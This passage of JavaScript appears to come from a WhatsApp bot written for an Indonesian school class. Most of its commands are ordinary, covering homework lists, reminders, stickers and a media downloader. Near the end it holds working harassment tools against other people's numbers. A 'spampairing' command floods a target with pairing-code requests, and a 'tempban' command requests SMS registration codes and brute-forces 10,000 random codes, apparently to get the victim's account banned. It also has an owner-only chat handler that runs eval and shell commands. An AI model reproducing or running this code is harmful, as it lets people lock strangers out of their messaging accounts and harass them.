    text: `✅ Tugas berhasil diperbarui:\n📚 *${mapelRaw}*\n- ${deskripsi}\n- Deadline baru: ${deadline.format('D MMMM YYYY')}`
  }, { quoted: m });
}
break;

case 'mapel': {
  const emojiMapel = {
    'RPL': '💻',
    'PKWU': '💸',
    'Bahasa Inggris': '🇬🇧',
    'Bahasa Indonesia': '🇮🇩',
    'Bahasa Bali': '🪻',
    'Matematika': '📐',
    'Agama': '🙏',
    'DKV': '🎨',
  };

  let teks = '*📚 Daftar Mapel*\n\n';
  const entries = Object.entries(emojiMapel);

  entries.forEach(([mapel, emoji], i) => {
    const namaMapel = mapel.charAt(0).toUpperCase() + mapel.slice(1);
    teks += `${i + 1}. ${emoji} ${namaMapel}\n`;
  });

  return sock.sendMessage(from, { text: teks }, { quoted: m });
}
break;

case 'listtugas':
case 'tugas': {
  cleanTugas();
  const tugasFile = './database/tugas.json';
  const tugasDB = fs.existsSync(tugasFile)
    ? JSON.parse(fs.readFileSync(tugasFile))
    : [];

  
  const moment = require('moment-timezone');
  moment.locale('id');
  const zonaWaktu = 'Asia/Makassar';
  

  const tugasAktif = tugasDB
  .filter(t => t.jid === from && t.status === 'belum')
  .sort((a, b) => {
    const timeA = Number(a.timestamp);
    const timeB = Number(b.timestamp);
    return timeA - timeB;
  });

  if (!tugasDB.length || !tugasAktif.length) {
    const pesanKosong = !tugasDB.length
      ? '📭 Tidak ada tugas yang tersedia saat ini.'
      : '✅ Semua tugas sudah diselesaikan!';
    return sock.sendMessage(from, { text: pesanKosong }, { quoted: m });
  }

  let teks = `📚 *Daftar Tugas XI RPL 4*\n\n`;

  tugasAktif.forEach((tugas, i) => {
    const { emoji, mapel } = getEmojiMapel(tugas.mapel);
    const deadlineFormatted = moment(tugas.timestamp).tz(zonaWaktu).format('D MMMM YYYY');

    teks += `*${i + 1}. ${emoji} ${mapel}*\n`;
    teks += `- ${tugas.deskripsi}\n`;
    teks += `- ${deadlineFormatted}❗\n\n`;
    teks += `----------------------------------------------\n\n`;
  }); 

  return sock.sendMessage(from, { text: teks }, { quoted: m });
}
break;

case 'autoreminder': {
  const folder = './database';
  const path = `${folder}/reminder.json`;
  const jid = m.chat;

  if (!isGroup) return m.reply('❌ Perintah ini hanya bisa digunakan di grup.');
  if (!isPengurus) return m.reply('❌ Hanya pengurus yang bisa mengatur auto reminder.');

  const status = args[0]?.toLowerCase();
  if (!['on', 'off'].includes(status)) {
    return m.reply('⚙️ Format salah!\nGunakan: `.autoreminder on` atau `.autoreminder off`');
  }

  // Pastikan folder dan file tersedia
  if (!fs.existsSync(folder)) fs.mkdirSync(folder);
  if (!fs.existsSync(path)) fs.writeFileSync(path, '[]');

  let reminderList = [];
  try {
    reminderList = JSON.parse(fs.readFileSync(path));
    if (!Array.isArray(reminderList)) reminderList = [];
  } catch (err) {
    console.error('❌ Gagal membaca reminder.json:', err);
    reminderList = [];
  }

  const index = reminderList.findIndex(r => r.jid === jid);
  if (index !== -1) {
    reminderList[index].status = status === 'on' ? 'aktif' : 'nonaktif';
  } else {
    reminderList.push({ jid, status: status === 'on' ? 'aktif' : 'nonaktif' });
  }

  try {
    fs.writeFileSync(path, JSON.stringify(reminderList, null, 2));
    console.log('✅ Reminder berhasil disimpan:', reminderList);
  } catch (err) {
    console.error('❌ Gagal menulis ke reminder.json:', err);
    return m.reply('❌ Gagal menyimpan pengaturan reminder.');
  }

  m.reply(`✅ Auto reminder telah *${status === 'on' ? 'diaktifkan' : 'dinonaktifkan'}* untuk grup ini.\n⏰Sekarang atur waktunya dengan cara .reminder\nContoh: .reminder 08.00`);
}
break;

// Helper function to get the phone number
async function getPhoneNumber() {
  if (m.mentionedJid?.length > 0) {
    return m.mentionedJid[0];
  } else {
    let raw = qtext.split("|")[0].replace(/[^0-9]/g, '');
    if (raw.startsWith("0")) return fluxreply(`Gunakan format internasional: 628xxx`);
    return `${raw}@s.whatsapp.net`;
  }
}

// Add Owner / Premium Handler
async function addOwnerOrPremium(commandType) {
  if (!DevOnly) return m.reply(mess.owner);

  let numero = await getPhoneNumber();
  let isValid = await sock.onWhatsApp(numero);
  if (isValid.length === 0) return fluxreply(example("628xxx or tag @user"))

  if (commandType === 'addowner' || commandType === 'addown') {
    if (!owner.includes(numero)) owner.push(numero);
    if (!Premium.includes(numero)) Premium.push(numero);
    fs.writeFileSync('./account/Own.json', JSON.stringify(owner, null, 2));
    fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
    m.reply(`Number ${numero.split('@')[0]} berhasil ditambahkan sebagai Owner & Premium!`);
  } else if (commandType === 'addpremium' || commandType === 'addprem') {
    if (!Premium.includes(numero)) Premium.push(numero);
    fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
    m.reply(`Number ${numero.split('@')[0]} berhasil ditambahkan ke Pengurus Kelas!`);
  }
}

// Delete Owner / Premium Handler
async function deleteOwnerOrPremium(commandType) {
  if (!DevOnly) return m.reply(mess.owner);

  let numero = await getPhoneNumber();
  let indexOwner = owner.indexOf(numero);
  let indexPremium = Premium.indexOf(numero);

  if (indexOwner === -1 && indexPremium === -1) {
    return fluxreply(`Nomor ${numero.split('@')[0]} tidak ditemukan dalam database.`);
  }

  if (commandType === 'delowner' || commandType === 'delown') {
    if (indexOwner !== -1) owner.splice(indexOwner, 1);
    if (indexPremium !== -1) Premium.splice(indexPremium, 1);
    fs.writeFileSync('./account/Own.json', JSON.stringify(owner, null, 2));
    fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
    m.reply(`Number ${numero.split('@')[0]} berhasil dihapus dari database!`);
  } else if (commandType === 'delpremium' || commandType === 'delprem') {
    if (indexPremium !== -1) {
      Premium.splice(indexPremium, 1);
      fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
      m.reply(`Number ${numero.split('@')[0]} berhasil dihapus dari Premium!`);
    } else {
      fluxreply(`Nomor ${numero.split('@')[0]} tidak ada dalam database Premium.`);
    }
  }
}
  case 'addowner':
  case 'addown':
    await addOwnerOrPremium('addowner');
    break;

  case 'delowner':
  case 'delown':
    await deleteOwnerOrPremium('delowner');
    break;

  case 'addpengurus':
    await addOwnerOrPremium('addpremium');
    break;

  case 'delpengurus':
    await deleteOwnerOrPremium('delpremium');
  break;
  
case 'qc': {
  if (!q) return fluxreply(`Send command with text. ${prefix + command} Hai`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await sock.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  sock.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;
case "play": {
        if (!qtext) return fluxreply(`send title song\n example ${prefix + command} ransom`);
        let search = await yts(qtext);
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'origin').key;
          sock.sendMessage(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{ quoted:m })
        }
break

case "readvo":
case "readviewonce":
case "rvo": {
  if (!m.quoted) return fluxreply(
    `*❌ Syntax Error!!*\n*Example:* Reply ViewOnce with caption ${prefix + command}`);

  try {
    let buffer = await m.quoted.download();
    let type = m.quoted.mtype;
    let sendOptions = { quoted: m };

    if (type === "videoMessage") {
      await sock.sendMessage(m.chat, { video: buffer, caption: m.quoted.text || "" }, sendOptions);
    } else if (type === "imageMessage") {
      await sock.sendMessage(m.chat, { image: buffer, caption: m.quoted.text || "" }, sendOptions);
    } else if (type === "audioMessage") {
      await sock.sendMessage(m.chat, {
        audio: buffer,
        mimetype: "audio/mpeg",
        ptt: m.quoted.ptt || false
      }, sendOptions);
    } else {
      return fluxreply("❌ Media View Once tidak didukung.");
    }
  } catch (err) {
    console.error(err);
    fluxreply("⚠️ Gagal membaca pesan View Once.");
  }
}
break;

case "setpp": {
  if (!DevOnly) return 
  if (!m.quoted) return fluxreply("Reply to an image with this command to set profile picture!");
  
  try {
    const media = await sock.downloadAndSaveMediaMessage(m.quoted);
    const { img } = await generateProfilePicture(media);

    await sock.query({
      tag: "iq",
      attrs: {
        to: BotNum,
        type: "set",
        xmlns: "w:profile:picture"
      },
      content: [{
        tag: "picture",
        attrs: {
          type: "image"
        },
        content: img
      }]
    });

    await m.reply("Profile picture set successfully!");
  } catch (error) {
    console.error(error);
    await m.reply("Failed to set profile picture. Make sure you replied to an image and try again.");
  }
}
break
case "delpp": {
if (!DevOnly) return 
  sock.removeProfilePicture(sock.user.id);
  m.reply("Success Delete Profile Picture");
}
break;
case 'tovn': {
  if (!/video/.test(mime) && !/audio/.test(mime)) return fluxreply(`Reply media with caption ${prefix + command}`);
  if (!quoted) return fluxreply(`Reply video/vn with caption ${prefix + command}`);
  
  let media = await quoted.download();
  let { toAudio } = require('./database/pusat/Data4.js');
  let audio = await toAudio(media, 'mp4');
  
  sock.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;

case 'h':
case 'ht':
case 'hidetag': {
  if (!DevOnly && !Adm) return fluxreply('Admin group only.');
  if (!m.isGroup) return;

  const mentions = participants.map(p => p.id);

  if (m.quoted) {
    // Kirim pesan hasil reply dengan mention
    sock.sendMessage(from, {
      text: m.quoted.text || '_[Pesan tidak diketahui]_',
      mentions
    }, { quoted: m });
  } else if (q) {
    // Kirim teks biasa jika ada teks yang diketik
    sock.sendMessage(from, {
      text: q,
      mentions
    }, { quoted: m });
  } else {
    // Jika tidak ada teks dan tidak reply pesan
    m.reply('Mana teksnya?');
  }
  break;
}


case 'kick': {
if (!DevOnly && !Adm) return fluxreply('Admin group only.')
  if (!m.isGroup) return
  if (!BotAdm) return fluxreply('Bot harus admin terlebih dahulu.')

  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!q) return fluxreply("Send number / tag users ");
  await sock.groupParticipantsUpdate(from, [users], 'remove');
}
break;
case 'linkgroup': case 'linkgc': {
if (!DevOnly && !Adm) return fluxreply('Admin group only.')
  if (!m.isGroup) return
  if (!BotAdm) return fluxreply('Bot harus admin terlebih dahulu.')

  let responsegg = await sock.groupInviteCode(from);
  sock.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true });
}
break;
case 'resetlinkgc': {
if (!DevOnly && !Adm) return fluxreply('Admin group only.')
  if (!m.isGroup) return
  if (!BotAdm) return fluxreply('Bot harus admin terlebih dahulu.')
  
  sock.groupRevokeInvite(from);
}
break;
case 'public': {
  if (!DevOnly) return 
  sock.public = true;
  m.reply(`*Success Change Mode Self To Public*`);
}
break;
case 'self': case 'private': {
  if (!DevOnly) return
  sock.public = false;
  m.reply(`*Success Change Mode Public To Self*`);
}
break
case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return fluxreply(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return fluxreply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return fluxreply('Failed to download media!');
    }

    const uploadImage = require('./database/pusat/Data6.js');
    const uploadFile = require('./database/pusat/Data7.js');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return fluxreply('Failed to upload media!');
    }

    m.reply(`(no expiration date/unknown)\n ${link}`)
}
break
case 'sticker': case 's': {
  if (!quoted) return m.reply(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await sock.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return fluxreply('max 10s');
    
    let media = await quoted.download();
    let encmedia = await sock.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return fluxreply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
break;
case 'brat': {
            if (!q) return m.reply(`Send command with text. ${prefix + command} Rizxvelz`)
            const imageUrl = `https://api.siputzx.my.id/api/m/brat?text=${q}`
            await makeStickerFromUrl(imageUrl, sock, m);
        }
       break

case 'bot': {
m.reply(`*Bot Active*`)
}
break
//END
case "joingc": case "join": {
if (!DevOnly) return m.reply(`woi, lu siapa?`)
if (!q) return fluxreply(example("linkgcnya"))
let result = args[0].split("https://chat.whatsapp.com/")[1];
let target = await sock.groupAcceptInvite(result);
m.reply(`Berhasil`)
}
break

//TIKTOK CASE		
case 'tt': case 'ttslide': case 'tiktok': {
if (!text) return m.reply("mana url nya?")
if (!text.startsWith("https://")) return m.reply("mana url nya?")
await tiktokDl(q).then(async (result) => {
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: sock.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Done Lek*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: ftoko})
await sock.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await sock.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Done Lek*`}, {quoted: m })
}
}).catch(e => console.log(e))
await sock.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
      
// END

////////////// END CASE BUG //////////////

case "cekidch": case "idch": {
if (!text) return fluxreply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return fluxreply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await sock.newsletterMetadata("invite", result)
let teks = `${res.id}
`
return m.reply2(teks)
}
break

case 'spamcode':
case 'spampairing':
case 'spampair': {
  if (!DevOnly && !PremOnly) return m.reply(mess.owner);
  if (!args[0]) return fluxreply(example("628xxxxx 5"));

  const number = args[0];
  const countStr = args[1] || "200";
  const spamCount = parseInt(countStr.trim());

  if (isNaN(spamCount) || spamCount <= 0) return fluxreply("Tolol anj masukin angka yang bener");

  const target = number.replace(/[^0-9]/g, '').trim();
  if (!target) return fluxreply("Nomor tidak valid.");

  await m.reply(`𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗦𝗽𝗮𝗺 𝗣𝗮𝗶𝗿𝗶𝗻𝗴...
    𝗧𝗮𝗿𝗴𝗲𝘁: ${number} 
    𝗝𝘂𝗺𝗹𝗮𝗵: x${spamCount}`);

  const {
    makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion
  } = require('@whiskeysockets/baileys');

  const { state } = await useMultiFileAuthState('Spam Code');
  const { version } = await fetchLatestBaileysVersion();
  const sock = makeWASocket({
    auth: state,
    version,
    logger: pino({ level: 'fatal' })
  });

  for (let i = 0; i < spamCount; i++) {
    await sleep(1500);
    let code = await sock.requestPairingCode(target);
    console.log(`# Spam Pairing Code ke ${target} => ${code}`);
  }

  await m.reply(`✅ Done Spam Pairing Code
    𝗧𝗮𝗿𝗴𝗲𝘁: ${number} 
    𝗝𝘂𝗺𝗹𝗮𝗵: x${spamCount}`);
  await sleep(1500);
}
break;

case 'tempban': {
    if (!DevOnly && !PremOnly) return m.reply(mess.owner);
    if (args.length < 1) return fluxreply(example("*62xxx*"));
    
    const xtarget = args[0];
    // Memastikan nomor telepon dimulai dengan '62' dan memiliki panjang yang sesuai
    if (!/^62\d{8,}$/.test(xtarget)) return fluxreply(example("*62xxx*"));
    
    const APOCALYPSECountryCode = '62'; // Kode negara Indonesia
    const APOCALYPSENumber = xtarget.replace('@s.whatsapp.net', '');
    const APOCALYPSEmerge = `${APOCALYPSECountryCode}${APOCALYPSENumber}`;
    const APOCALYPSEMention = APOCALYPSEmerge + '@s.whatsapp.net';
    
    await m.reply(`</> 𝐒𝐮𝐜𝐜𝐞𝐬 𝐓𝐞𝐦𝐩𝐁𝐚𝐧〽️`);
    
    try {
        const {
            stateAPOCALYPSE,
            saveCredsAPOCALYPSE
        } = await useMultiFileAuthState('./Band');
        
        const APOCALYPSERequest = await sock.requestRegistrationCode({
            phoneNumber: '+' + APOCALYPSECountryCode + `${APOCALYPSENumber}`,
            phoneNumberCountryCode: APOCALYPSECountryCode,
            phoneNumberNationalNumber: `${APOCALYPSENumber}`,
            phoneNumberMobileCountryCode: 724,
            method: 'sms'
        });
    } catch (err) {
        console.error(err);
    }

    for (let i = 0; i < 10000; i++) {
        try {
            var APOCALYPSEPrefix = Math.floor(Math.random() * 999);
            var APOCALYPSESuffix = Math.floor(Math.random() * 999);
            await sock.register(`${APOCALYPSEPrefix}-${APOCALYPSESuffix}`);
        } catch (err) {
            console.log(`${APOCALYPSEPrefix}-${APOCALYPSESuffix}`);
        }
    }
}
break

//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!DevOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!DevOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!DevOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
// sock.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\